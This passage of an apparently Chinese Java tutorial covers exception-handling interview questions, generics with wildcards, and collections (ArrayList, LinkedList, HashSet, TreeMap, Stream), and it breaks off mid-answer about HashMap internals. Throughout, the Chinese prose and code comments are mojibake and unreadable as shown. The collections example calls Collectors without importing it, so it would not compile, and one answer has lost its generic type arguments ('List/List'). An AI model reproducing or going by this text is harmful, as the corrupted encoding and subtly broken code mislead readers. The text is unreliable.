<li>ä¼ä¸šå¤„ç†åŸåˆ™ï¼šç¼–è¯‘æ—¶å¼‚å¸¸è¦ä¹ˆæ•è·å¤„ç†ï¼Œè¦ä¹ˆæŠ›ç»™ä¸Šå±‚å¹¶è¯´æ˜æ–‡æ¡£ï¼›è¿è¡Œæ—¶å¼‚å¸¸ä¼˜å…ˆé¢„é˜²ï¼ˆå¦‚åˆ¤ç©ºï¼‰ï¼Œå…³é”®èŠ‚ç‚¹ä¸»åŠ¨æ•è·ï¼Œé¿å…ç¨‹åºå´©æºƒã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼štry-catch-finally ä¸­ï¼Œfinally ä¸€å®šä¼šæ‰§è¡Œå—ï¼Ÿreturn åœ¨ finally å‰æ‰§è¡Œä¼šæ€æ ·ï¼Ÿç­”ï¼šfinally<strong>å‡ ä¹</strong>ä¸€å®šä¼šæ‰§è¡Œï¼Œé™¤é JVM é€€å‡ºï¼ˆå¦‚<code>System.exit(0)</code>ï¼‰ï¼›è‹¥ try/catch ä¸­æœ‰ returnï¼Œä¼šå…ˆæ‰§è¡Œ return çš„è¡¨è¾¾å¼è®¡ç®—ï¼Œå†æ‰§è¡Œ finallyï¼Œæœ€åè¿”å›ï¼ˆè‹¥ finally ä¸­æœ‰ returnï¼Œä¼šè¦†ç›–åŸ return å€¼ï¼Œä¼ä¸šä¸­ç¦æ­¢è¿™ä¹ˆåšï¼‰ã€‚</p>
</li>
<li>
<p>é—®ï¼šthrow å’Œ throws çš„åŒºåˆ«ï¼Ÿç­”ï¼š<code>throw</code>æ˜¯è¯­å¥ï¼Œæ‰‹åŠ¨æŠ›å‡ºå…·ä½“å¼‚å¸¸å¯¹è±¡ï¼ˆå¦‚<code>throw new BusinessException("é”™è¯¯")</code>ï¼‰ï¼›<code>throws</code>æ˜¯æ–¹æ³•å£°æ˜ï¼Œå£°æ˜è¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ï¼Œå‘ŠçŸ¥è°ƒç”¨æ–¹éœ€è¦å¤„ç†ã€‚</p>
</li>
<li>
<p>é—®ï¼šä¼ä¸šä¸­ä¸ºä»€ä¹ˆè¦è‡ªå®šä¹‰å¼‚å¸¸ï¼Ÿç­”ï¼šç»Ÿä¸€å¼‚å¸¸ç±»å‹ï¼Œä¾¿äºå…¨å±€å¼‚å¸¸å¤„ç†ï¼ˆå¦‚ Spring çš„<code>@ControllerAdvice</code>ï¼‰ï¼›åŒºåˆ†ä¸åŒä¸šåŠ¡é”™è¯¯åœºæ™¯ï¼Œæ–¹ä¾¿å®šä½é—®é¢˜ï¼›å¯æºå¸¦ä¸šåŠ¡é”™è¯¯ç  / ä¿¡æ¯ï¼Œé€‚é…å‰ç«¯é”™è¯¯æç¤ºã€‚</p>
</li>
</ol>
<h4 data-id="heading-3">3. ä¼ä¸šå®é™…åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>å…¨å±€å¼‚å¸¸å¤„ç†</strong>ï¼šSpring Boot é¡¹ç›®ä¸­ç”¨<code>@ControllerAdvice</code>+<code>@ExceptionHandler</code>ç»Ÿä¸€æ•è·æ‰€æœ‰å¼‚å¸¸ï¼Œè¿”å›æ ‡å‡†åŒ–é”™è¯¯å“åº”ï¼ˆé”™è¯¯ç  + é”™è¯¯ä¿¡æ¯ï¼‰ã€‚</li>
<li><strong>ä¸šåŠ¡æµç¨‹æ ¡éªŒ</strong>ï¼šä¸‹å•æ—¶è‹¥åº“å­˜ä¸è¶³ï¼ŒæŠ›å‡º<code>StockInsufficientException</code>ï¼›ç™»å½•æ—¶è‹¥ç”¨æˆ·åå¯†ç é”™è¯¯ï¼ŒæŠ›å‡º<code>AuthFailedException</code>ã€‚</li>
<li><strong>èµ„æºæ“ä½œå®¹é”™</strong>ï¼šæ•°æ®åº“æ“ä½œï¼ˆ<code>SQLException</code>ï¼‰ã€æ–‡ä»¶æ“ä½œï¼ˆ<code>IOException</code>ï¼‰æ•è·åï¼Œè®°å½•æ—¥å¿—å¹¶è½¬æ¢ä¸ºä¸šåŠ¡å¼‚å¸¸ï¼Œé¿å…æš´éœ²åº•å±‚æ•æ„Ÿä¿¡æ¯ã€‚</li>
<li><strong>å‚æ•°æ ¡éªŒ</strong>ï¼šæ¥å£å…¥å‚æ ¡éªŒå¤±è´¥æ—¶ï¼ŒæŠ›å‡º<code>IllegalArgumentException</code>æˆ–è‡ªå®šä¹‰<code>ParamValidException</code>ï¼Œé…åˆæ ¡éªŒæ¡†æ¶ï¼ˆå¦‚ Hibernate Validatorï¼‰ä½¿ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-4">äºŒã€æ³›å‹ï¼ˆGenericï¼‰</h3>
<p>æ³›å‹æ˜¯ JDK 5 + ç‰¹æ€§ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ â€œç±»å‹å‚æ•°åŒ–â€ï¼Œé¿å…ç±»å‹å¼ºè½¬ï¼Œæå‡ä»£ç å¤ç”¨æ€§å’Œç±»å‹å®‰å…¨æ€§ï¼Œæ˜¯é›†åˆã€æ¡†æ¶çš„åŸºç¡€ã€‚</p>
<h4 data-id="heading-5">1. æ ¸å¿ƒä»£ç ç¤ºä¾‹ï¼ˆæ³›å‹ç±» / æ–¹æ³• / æ¥å£ + é€šé…ç¬¦ï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">ArrayList</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">List</span>;

<span class="hljs-comment">/**
 * æ³›å‹æ ¸å¿ƒç¤ºä¾‹ï¼š
 * 1. æ³›å‹ç±»
 * 2. æ³›å‹æ–¹æ³•
 * 3. æ³›å‹æ¥å£
 * 4. æ³›å‹é€šé…ç¬¦ï¼ˆ? extends/superï¼‰
 */</span>
<span class="hljs-comment">// 1. æ³›å‹ç±»ï¼šé€šç”¨æ•°æ®åŒ…è£…ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataWrapper</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> T data;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DataWrapper</span>(T data) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data;
    }

    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getData</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> data;
    }

    <span class="hljs-comment">// æ³›å‹æ–¹æ³•ï¼šç‹¬ç«‹äºç±»çš„æ³›å‹</span>
    <span class="hljs-keyword">public</span> &lt;E&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">printData</span>(<span class="hljs-params">E extraData</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ ¸å¿ƒæ•°æ®ï¼š"</span> + data + <span class="hljs-string">"ï¼Œé¢å¤–æ•°æ®ï¼š"</span> + extraData);
    }
}

<span class="hljs-comment">// 2. æ³›å‹æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Converter</span>&lt;F, T&gt; {
    T <span class="hljs-title function_">convert</span>(F <span class="hljs-keyword">from</span>);
}

<span class="hljs-comment">// æ³›å‹æ¥å£å®ç°ï¼šStringè½¬Integer</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">StringToIntConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Converter</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Integer</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> <span class="hljs-keyword">from</span></span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Integer</span>.<span class="hljs-built_in">parseInt</span>(<span class="hljs-keyword">from</span>);
    }
}

<span class="hljs-comment">// 3. æ³›å‹é€šé…ç¬¦ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericUtil</span> {
    <span class="hljs-comment">// ä¸Šç•Œé€šé…ç¬¦ï¼šåªèƒ½è¯»å–ï¼Œä¸èƒ½æ·»åŠ ï¼ˆé™¤äº†nullï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">printList</span>(<span class="hljs-params">List&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Number</span>&gt; list</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Number</span> num : list) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">print</span>(num + <span class="hljs-string">" "</span>);
        }
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>();
        <span class="hljs-comment">// list.add(10); // ç¼–è¯‘é”™è¯¯ï¼šæ— æ³•ç¡®å®šå…·ä½“ç±»å‹</span>
    }

    <span class="hljs-comment">// ä¸‹ç•Œé€šé…ç¬¦ï¼šåªèƒ½æ·»åŠ ï¼Œè¯»å–æ—¶åªèƒ½è½¬Object</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">addIntToList</span>(<span class="hljs-params">List&lt;? <span class="hljs-variable language_">super</span> Integer&gt; list</span>) {
        list.<span class="hljs-title function_">add</span>(<span class="hljs-number">10</span>);
        list.<span class="hljs-title function_">add</span>(<span class="hljs-number">20</span>);
        <span class="hljs-comment">// Integer num = list.get(0); // ç¼–è¯‘é”™è¯¯ï¼šåªèƒ½è½¬Object</span>
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">// æ³›å‹ç±»ä½¿ç”¨</span>
        <span class="hljs-title class_">DataWrapper</span>&lt;<span class="hljs-title class_">String</span>&gt; strWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataWrapper</span>&lt;&gt;(<span class="hljs-string">"é»‘é©¬ç¨‹åºå‘˜"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(strWrapper.<span class="hljs-title function_">getData</span>()); <span class="hljs-comment">// æ— éœ€å¼ºè½¬</span>
        strWrapper.<span class="hljs-title function_">printData</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// æ³›å‹æ–¹æ³•ï¼šEè‡ªåŠ¨æ¨æ–­ä¸ºInteger</span>

        <span class="hljs-comment">// æ³›å‹æ¥å£ä½¿ç”¨</span>
        <span class="hljs-title class_">Converter</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; converter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringToIntConverter</span>();
        <span class="hljs-title class_">Integer</span> num = converter.<span class="hljs-title function_">convert</span>(<span class="hljs-string">"100"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"å­—ç¬¦ä¸²è½¬æ•°å­—ï¼š"</span> + num);

        <span class="hljs-comment">// æ³›å‹é€šé…ç¬¦ä½¿ç”¨</span>
        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Integer</span>&gt; intList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        intList.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);
        intList.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>);
        <span class="hljs-title class_">GenericUtil</span>.<span class="hljs-title function_">printList</span>(intList); <span class="hljs-comment">// ä¸Šç•Œé€šé…ç¬¦ï¼šNumberçš„å­ç±»éƒ½å¯ä¼ å…¥</span>

        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Object</span>&gt; objList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-title class_">GenericUtil</span>.<span class="hljs-title function_">addIntToList</span>(objList); <span class="hljs-comment">// ä¸‹ç•Œé€šé…ç¬¦ï¼šIntegerçš„çˆ¶ç±»éƒ½å¯ä¼ å…¥</span>
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ·»åŠ ååˆ—è¡¨ï¼š"</span> + objList);
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li>
<p><strong>æ³›å‹ç±»</strong>ï¼š<code>DataWrapper&lt;T&gt;</code>Â å¯åŒ…è£…ä»»æ„ç±»å‹æ•°æ®ï¼Œé¿å…ä¸º String/Integer ç­‰åˆ†åˆ«å†™åŒ…è£…ç±»ï¼Œæå‡å¤ç”¨æ€§ã€‚</p>
</li>
<li>
<p><strong>æ³›å‹æ–¹æ³•</strong>ï¼š<code>&lt;E&gt; void printData(E extraData)</code>Â ç‹¬ç«‹äºç±»çš„æ³›å‹ï¼Œè°ƒç”¨æ—¶è‡ªåŠ¨æ¨æ–­ç±»å‹ï¼Œçµæ´»åº¦æ›´é«˜ã€‚</p>
</li>
<li>
<p><strong>é€šé…ç¬¦</strong>ï¼š</p>
<ul>
<li><code>? extends Number</code>ï¼ˆä¸Šç•Œï¼‰ï¼šåªèƒ½è¯»å–ï¼Œé€‚åˆ â€œç”Ÿäº§è€…â€ åœºæ™¯ï¼ˆå¦‚éå†è¾“å‡ºï¼‰ï¼›</li>
<li><code>? super Integer</code>ï¼ˆä¸‹ç•Œï¼‰ï¼šåªèƒ½æ·»åŠ ï¼Œé€‚åˆ â€œæ¶ˆè´¹è€…â€ åœºæ™¯ï¼ˆå¦‚æ·»åŠ å…ƒç´ ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç±»å‹å®‰å…¨</strong>ï¼šæ³›å‹åœ¨ç¼–è¯‘æœŸæ£€æŸ¥ç±»å‹ï¼Œé¿å…è¿è¡Œæ—¶<code>ClassCastException</code>ï¼ˆå¦‚é›†åˆä¸­å­˜ String å´å– Integerï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-6">2. ä¼ä¸šé¢è¯•é¢˜</h4>
<ol>
<li>
<p>é—®ï¼šæ³›å‹çš„ä½œç”¨ï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ³›å‹ï¼Ÿç­”ï¼š</p>
<ul>
<li>ç±»å‹å®‰å…¨ï¼šç¼–è¯‘æœŸæ£€æŸ¥ç±»å‹ï¼Œé¿å…è¿è¡Œæ—¶ç±»å‹è½¬æ¢å¼‚å¸¸ï¼›</li>
<li>ä»£ç å¤ç”¨ï¼šä¸€å¥—ä»£ç é€‚é…å¤šç§ç±»å‹ï¼ˆå¦‚ List/Listï¼‰ï¼›</li>
<li>æ¶ˆé™¤å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼šæå‡ä»£ç å¯è¯»æ€§å’Œç®€æ´æ€§ã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šæ³›å‹æ“¦é™¤æ˜¯ä»€ä¹ˆï¼Ÿè¿è¡Œæ—¶èƒ½è·å–æ³›å‹ç±»å‹å—ï¼Ÿç­”ï¼šæ³›å‹æ“¦é™¤æ˜¯ JVM çš„æœºåˆ¶ï¼šç¼–è¯‘æœŸä¿ç•™æ³›å‹æ£€æŸ¥ï¼Œè¿è¡Œæ—¶æ³›å‹ä¿¡æ¯è¢«æ“¦é™¤ï¼ˆå¦‚<code>List&lt;String&gt;</code>å˜ä¸º<code>List</code>ï¼‰ï¼›é»˜è®¤æ— æ³•è·å–ï¼Œä½†å¯é€šè¿‡åå°„ï¼ˆå¦‚<code>ParameterizedType</code>ï¼‰è·å–æ³›å‹ç±»å‹ï¼ˆä¼ä¸šä¸­æ¡†æ¶å¸¸ç”¨ï¼Œå¦‚ MyBatisï¼‰ã€‚</p>
</li>
<li>
<p>é—®ï¼šæ³›å‹é€šé…ç¬¦<code>?</code>ã€<code>? extends T</code>ã€<code>? super T</code>çš„åŒºåˆ«ï¼Ÿç­”ï¼š</p>
<ul>
<li><code>?</code>ï¼šæ— ç•Œé€šé…ç¬¦ï¼Œå¯æ¥æ”¶ä»»æ„ç±»å‹ï¼Œåªèƒ½è¯»å–ï¼ˆè½¬ Objectï¼‰ï¼Œä¸èƒ½æ·»åŠ ï¼›</li>
<li><code>? extends T</code>ï¼šä¸Šç•Œé€šé…ç¬¦ï¼Œåªèƒ½æ¥æ”¶ T æˆ– T çš„å­ç±»ï¼Œé€‚åˆè¯»å–ï¼›</li>
<li><code>? super T</code>ï¼šä¸‹ç•Œé€šé…ç¬¦ï¼Œåªèƒ½æ¥æ”¶ T æˆ– T çš„çˆ¶ç±»ï¼Œé€‚åˆæ·»åŠ ã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šæ³›å‹ç±»å’Œæ³›å‹æ–¹æ³•çš„åŒºåˆ«ï¼Ÿç­”ï¼šæ³›å‹ç±»çš„æ³›å‹å‚æ•°åœ¨ç±»çº§åˆ«ï¼Œæ‰€æœ‰æ–¹æ³•å…±äº«ï¼›æ³›å‹æ–¹æ³•çš„æ³›å‹å‚æ•°åœ¨æ–¹æ³•çº§åˆ«ï¼Œç‹¬ç«‹äºç±»ï¼Œå¯åœ¨éæ³›å‹ç±»ä¸­å®šä¹‰ï¼Œè°ƒç”¨æ—¶æ›´çµæ´»ã€‚</p>
</li>
</ol>
<h4 data-id="heading-7">3. ä¼ä¸šå®é™…åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>é›†åˆæ¡†æ¶</strong>ï¼šJava é›†åˆï¼ˆList/Map/Setï¼‰å…¨éƒ¨åŸºäºæ³›å‹ï¼Œå¦‚<code>Map&lt;String, User&gt;</code>ã€<code>List&lt;Order&gt;</code>ï¼Œé¿å…ç±»å‹æ··ä¹±ã€‚</li>
<li><strong>é€šç”¨å·¥å…·ç±»</strong>ï¼šä¼ä¸šå°è£…é€šç”¨å·¥å…·ï¼ˆå¦‚ç¼“å­˜å·¥å…·ã€è½¬æ¢å·¥å…·ï¼‰ï¼Œç”¨æ³›å‹é€‚é…å¤šç§ç±»å‹ï¼Œå¦‚<code>CacheUtil&lt;K, V&gt;</code>ã€<code>ConvertUtil&lt;F, T&gt;</code>ã€‚</li>
<li><strong>æ¡†æ¶å¼€å‘</strong>ï¼šSpring/MyBatis ç­‰æ¡†æ¶å¤§é‡ä½¿ç”¨æ³›å‹ï¼Œå¦‚<code>Mapper&lt;User&gt;</code>ã€<code>RestTemplate.getForObject(String url, Class&lt;T&gt; responseType)</code>ã€‚</li>
<li><strong>è‡ªå®šä¹‰å®¹å™¨</strong>ï¼šä¸šåŠ¡ä¸­å°è£…åˆ†é¡µç»“æœ<code>PageResult&lt;T&gt;</code>ï¼Œé€‚é…ç”¨æˆ·åˆ—è¡¨ã€è®¢å•åˆ—è¡¨ç­‰ä¸åŒåˆ†é¡µåœºæ™¯ã€‚</li>
</ol>
<h3 data-id="heading-8">ä¸‰ã€é›†åˆï¼ˆCollectionï¼‰</h3>
<p>é›†åˆæ˜¯ Java å­˜å‚¨å’Œæ“ä½œä¸€ç»„æ•°æ®çš„å®¹å™¨ï¼Œä¼ä¸šä¸­ 90% ä»¥ä¸Šçš„ä¸šåŠ¡éƒ½ä¼šç”¨åˆ°ï¼Œæ ¸å¿ƒåˆ†ä¸º<code>Collection</code>ï¼ˆå•åˆ—ï¼‰å’Œ<code>Map</code>ï¼ˆåŒåˆ—ï¼‰ä¸¤å¤§ä½“ç³»ã€‚</p>
<h4 data-id="heading-9">1. æ ¸å¿ƒä»£ç ç¤ºä¾‹ï¼ˆå¸¸ç”¨é›†åˆ + æ ¸å¿ƒæ“ä½œï¼‰</h4>
<pre><code class="hljs language-csharp" lang="csharp">import java.util.*;

<span class="hljs-comment">/**
 * é›†åˆæ ¸å¿ƒç¤ºä¾‹ï¼š
 * 1. Listï¼ˆArrayList/LinkedListï¼‰
 * 2. Setï¼ˆHashSet/TreeSetï¼‰
 * 3. Mapï¼ˆHashMap/TreeMapï¼‰
 * 4. é›†åˆéå†/æ’åº/ç­›é€‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CollectionDemo</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        <span class="hljs-comment">// 1. Listï¼šæœ‰åºã€å¯é‡å¤ã€ç´¢å¼•è®¿é—®</span>
        List&lt;String&gt; arrayList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        arrayList.<span class="hljs-keyword">add</span>(<span class="hljs-string">"Java"</span>);
        arrayList.<span class="hljs-keyword">add</span>(<span class="hljs-string">"Python"</span>);
        arrayList.<span class="hljs-keyword">add</span>(<span class="hljs-string">"Java"</span>); <span class="hljs-comment">// å…è®¸é‡å¤</span>
        <span class="hljs-comment">// éå†</span>
        <span class="hljs-keyword">for</span> (String s : arrayList) {
            System.<span class="hljs-keyword">out</span>.print(s + <span class="hljs-string">" "</span>);
        }
        System.<span class="hljs-keyword">out</span>.println();
        <span class="hljs-comment">// æ’åº</span>
        Collections.sort(arrayList);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ’åºåï¼š"</span> + arrayList);

        <span class="hljs-comment">// LinkedListï¼šé€‚åˆé¢‘ç¹å¢åˆ ï¼ˆé“¾è¡¨ç»“æ„ï¼‰</span>
        List&lt;Integer&gt; linkedList = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();
        linkedList.addFirst(<span class="hljs-number">1</span>);
        linkedList.addLast(<span class="hljs-number">3</span>);
        linkedList.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// ç´¢å¼•æ’å…¥</span>
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"LinkedListï¼š"</span> + linkedList);

        <span class="hljs-comment">// 2. Setï¼šæ— åºã€ä¸å¯é‡å¤</span>
        Set&lt;String&gt; hashSet = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();
        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">"A"</span>);
        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">"B"</span>);
        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">"A"</span>); <span class="hljs-comment">// é‡å¤å…ƒç´ ä¸ä¼šæ·»åŠ </span>
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"HashSetï¼š"</span> + hashSet); <span class="hljs-comment">// æ— åº</span>

        <span class="hljs-comment">// TreeSetï¼šæœ‰åºï¼ˆè‡ªç„¶æ’åº/è‡ªå®šä¹‰æ’åºï¼‰</span>
        Set&lt;Integer&gt; treeSet = <span class="hljs-keyword">new</span> TreeSet&lt;&gt;();
        treeSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">3</span>);
        treeSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);
        treeSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"TreeSetï¼ˆè‡ªç„¶æ’åºï¼‰ï¼š"</span> + treeSet); <span class="hljs-comment">// [1,2,3]</span>

        <span class="hljs-comment">// 3. Mapï¼šé”®å€¼å¯¹ã€é”®å”¯ä¸€</span>
        Map&lt;String, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
        hashMap.put(<span class="hljs-string">"è¯­æ–‡"</span>, <span class="hljs-number">90</span>);
        hashMap.put(<span class="hljs-string">"æ•°å­¦"</span>, <span class="hljs-number">95</span>);
        hashMap.put(<span class="hljs-string">"è¯­æ–‡"</span>, <span class="hljs-number">92</span>); <span class="hljs-comment">// è¦†ç›–å·²æœ‰é”®</span>
        <span class="hljs-comment">// éå†Mapï¼ˆä¼ä¸šæ¨èæ–¹å¼ï¼‰</span>
        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : hashMap.entrySet()) {
            System.<span class="hljs-keyword">out</span>.println(entry.getKey() + <span class="hljs-string">"ï¼š"</span> + entry.getValue());
        }
        <span class="hljs-comment">// è·å–å€¼</span>
        Integer mathScore = hashMap.getOrDefault(<span class="hljs-string">"æ•°å­¦"</span>, <span class="hljs-number">0</span>);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ•°å­¦æˆç»©ï¼š"</span> + mathScore);

        <span class="hljs-comment">// TreeMapï¼šæŒ‰é”®æ’åº</span>
        Map&lt;String, Integer&gt; treeMap = <span class="hljs-keyword">new</span> TreeMap&lt;&gt;(hashMap);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"TreeMapï¼ˆæŒ‰é”®æ’åºï¼‰ï¼š"</span> + treeMap);

        <span class="hljs-comment">// 4. é›†åˆç­›é€‰ï¼ˆJDK 8+ Streamï¼‰</span>
        List&lt;Integer&gt; numList = Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>);
        List&lt;Integer&gt; evenList = numList.stream()
                .filter(num -&gt; num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-comment">// ç­›é€‰å¶æ•°</span>
                .collect(Collectors.toList());
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"å¶æ•°åˆ—è¡¨ï¼š"</span> + evenList);
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li><strong>List é€‰å‹</strong>ï¼š<code>ArrayList</code>ï¼ˆæ•°ç»„ç»“æ„ï¼‰é€‚åˆéšæœºè®¿é—®ã€è¯»å¤šå†™å°‘ï¼›<code>LinkedList</code>ï¼ˆé“¾è¡¨ç»“æ„ï¼‰é€‚åˆé¢‘ç¹å¢åˆ ï¼ˆå¦‚é˜Ÿåˆ— / æ ˆï¼‰ã€‚</li>
<li><strong>Set é€‰å‹</strong>ï¼š<code>HashSet</code>ï¼ˆå“ˆå¸Œè¡¨ï¼‰æŸ¥è¯¢å¿«ï¼ˆO (1)ï¼‰ï¼Œæ— åºï¼›<code>TreeSet</code>ï¼ˆçº¢é»‘æ ‘ï¼‰æœ‰åºï¼ŒæŸ¥è¯¢ O (logn)ã€‚</li>
<li><strong>Map é€‰å‹</strong>ï¼š<code>HashMap</code>ï¼ˆå“ˆå¸Œè¡¨ï¼‰ä¼ä¸šé¦–é€‰ï¼ŒæŸ¥è¯¢ / æ’å…¥å¿«ï¼›<code>TreeMap</code>æŒ‰é”®æ’åºï¼Œé€‚åˆéœ€è¦æœ‰åºçš„åœºæ™¯ã€‚</li>
<li><strong>Stream æµ</strong>ï¼šJDK 8 + ç‰¹æ€§ï¼Œä¼ä¸šä¸­æ›¿ä»£ä¼ ç»Ÿå¾ªç¯ï¼Œå®ç°é›†åˆçš„ç­›é€‰ã€æ˜ å°„ã€èšåˆï¼Œä»£ç æ›´ç®€æ´ã€‚</li>
</ul>
<h4 data-id="heading-10">2. ä¼ä¸šé¢è¯•é¢˜</h4>
<ol>
<li>
<p>é—®ï¼šArrayList å’Œ LinkedList çš„åŒºåˆ«ï¼Ÿä¼ä¸šä¸­å¦‚ä½•é€‰æ‹©ï¼Ÿç­”ï¼š</p>
<ul>
<li>åº•å±‚ç»“æ„ï¼šArrayList æ˜¯åŠ¨æ€æ•°ç»„ï¼ŒLinkedList æ˜¯åŒå‘é“¾è¡¨ï¼›</li>
<li>è®¿é—®æ•ˆç‡ï¼šArrayList éšæœºè®¿é—®å¿«ï¼ˆO (1)ï¼‰ï¼ŒLinkedList æ…¢ï¼ˆO (n)ï¼‰ï¼›</li>
<li>å¢åˆ æ•ˆç‡ï¼šArrayList å°¾éƒ¨å¢åˆ å¿«ï¼Œä¸­é—´å¢åˆ æ…¢ï¼ˆéœ€ç§»åŠ¨å…ƒç´ ï¼‰ï¼›LinkedList ä»»æ„ä½ç½®å¢åˆ å¿«ï¼ˆO (1)ï¼‰ï¼›</li>
<li>å†…å­˜ï¼šArrayList æœ‰æ‰©å®¹å†—ä½™ï¼ŒLinkedList æ¯ä¸ªèŠ‚ç‚¹å­˜å‰åæŒ‡é’ˆï¼Œå†…å­˜å ç”¨é«˜ï¼›</li>
<li>é€‰å‹ï¼šè¯»å¤šå†™å°‘ç”¨ ArrayListï¼Œé¢‘ç¹å¢åˆ ï¼ˆå¦‚é˜Ÿåˆ—ï¼‰ç”¨ LinkedListã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šHashMap çš„åº•å±‚åŸç†ï¼ŸJDK 1.7 å’Œ 1.8 çš„åŒºåˆ«ï¼Ÿç­”ï¼š</p>
<ul>
<li>JDK 1.7ï¼šæ•°ç»„ + é“¾è¡¨ï¼Œå“ˆå¸Œå†²çªç”¨é“¾è¡¨è§£å†³ï¼Œå¤´æ’æ³•ï¼ˆå¤šçº¿ç¨‹ä¸‹æ˜“æˆç¯ï¼‰ï¼›</li>
